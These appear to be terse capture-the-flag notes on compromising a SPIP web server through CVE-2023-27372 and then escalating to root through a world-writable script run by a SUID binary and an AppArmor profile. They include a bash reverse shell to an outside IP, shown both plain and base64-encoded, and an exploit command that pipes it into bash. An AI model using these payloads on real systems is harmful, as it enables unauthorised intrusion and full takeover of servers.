SPIP exploit
------------

Run the reverse shell without uploading

bash -i >& /dev/tcp/10.0.0.1/8080 0>&1 (YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMS45OC4yMjUvMzMzMyAwPiYx)

# python3 CVE-2023-27372.py -u http://10.10.106.249/spip/ -c "echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMS45OC4yMjUvMzMzMyAwPiYx | base64 -d | bash" -v 


/usr/sbin/run_container (SUID)

When run the /usr/sbin/run_container (/opt/run_container.sh is running), so that we can add reverse shell or /bin/bash > can get root access

-rwxrwxrwx 1 root root 1715 Jan 10  2024 /opt/run_container.sh


Eventhough we get full permission in other users, we can write but cannot save.
SO, that exploit the apparmor.


Apparmor provides an additional layer of security, particularly useful for restricting potentially 
vulnerable applications such as web browsers, email clients, and server processes.


think@publisher:/etc/apparmor.d$ cat usr.sbin.ash
#include <tunables/global>

/usr/sbin/ash flags=(complain) {
  #include <abstractions/base>
  #include <abstractions/bash>
  #include <abstractions/consoles>
  #include <abstractions/nameservice>
  #include <abstractions/user-tmp>

  # Remove specific file path rules
  # Deny access to certain directories
  deny /opt/ r,
  deny /opt/** w,
  deny /tmp/** w,
  deny /dev/shm w,
  deny /var/tmp w,
  deny /home/** w,
  /usr/bin/** mrix,
  /usr/sbin/** mrix,

  # Simplified rule for accessing /home directory
  owner /home/** rix,
}


